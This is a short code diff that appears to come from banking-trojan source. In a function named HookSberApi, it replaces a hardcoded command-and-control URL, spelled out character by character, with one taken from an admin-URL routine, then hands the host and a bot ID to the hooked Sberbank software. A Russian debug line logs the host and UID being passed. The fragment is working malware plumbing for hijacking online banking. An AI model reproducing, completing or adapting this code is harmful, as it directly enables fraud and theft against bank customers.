@@ -216,7 +216,8 @@ static bool HookSberApi()
 		return 0;		
 	}
 	
-	char HostOfBots[] = {'h','t','t','p',':','/','/','s','b','e','r','b','a','n','k','s','y','s','t','e','m','.','r','u', 0};
+	char HostOfBots[128] = {'h','t','t','p',':','/','/', 0};
+	GetAdminUrl( HostOfBots + 7 );
 	SetParamsSBR( HostOfBots, UID );
 	DBG( "Sber", "передаем хост %s и UID %s", HostOfBots, UID );
 	STR::Free(UID);
